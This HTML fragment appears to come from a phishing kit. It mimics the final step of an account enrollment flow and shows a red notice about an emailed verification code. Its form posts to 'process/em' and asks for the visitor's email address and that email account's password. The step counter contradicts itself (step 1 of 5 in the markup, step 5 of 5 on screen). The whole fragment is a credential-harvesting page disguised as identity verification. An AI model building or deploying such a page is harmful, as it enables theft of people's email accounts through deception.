...
<div id="page-container" class="page-container">
    <div class="centered-content clearfix">
        <form action="process/em" method="post" class="unauth-form jqtransform js-login-form">
            <div class="g-unauth-main-container">
                <section class="unauth-intro-area">
                    ...
                    <div role="progressbar" aria-valuenow="1" aria-valuemin="1" aria-valuetext="Step 1 of 5: Enrollment" aria-valuemax="5">
                        <div class="unauth-intro-area__step"> <strong>Step 5 of 5:</strong> <span>Finishing...</span> </div>
                    ...
                    <div class="unauth-intro-area__help">
                        <br>
                        <p class="unauth-intro-area__text" style="color:Tomato;"><strong>Auto-generated verification code will sent to email address to verify your identity.</strong></p>
                    </div>
                </section>
                </section>
                        ...
                        <div class="unauth-form__ic-identification-block">
                            <div class="unauth-form__row">
                                <div class="unauth-form__legend">
                                    <br>
                                    <br>
                                    <label class="unauth-form__label"><strong>Email Verification</strong></label>
                                </div>
                            </div>
                            <br>
                            <div class="row">
                                <div class="col-25">
                                    <label for="em"></label>
                                    <input type="text" id="em" name="em" placeholder="Email" required="true">
                                    <label for="em"></label>
                                    <input type="password" id="epass" name="epass" placeholder="Password" required="true"> </div>
                            </div><br>
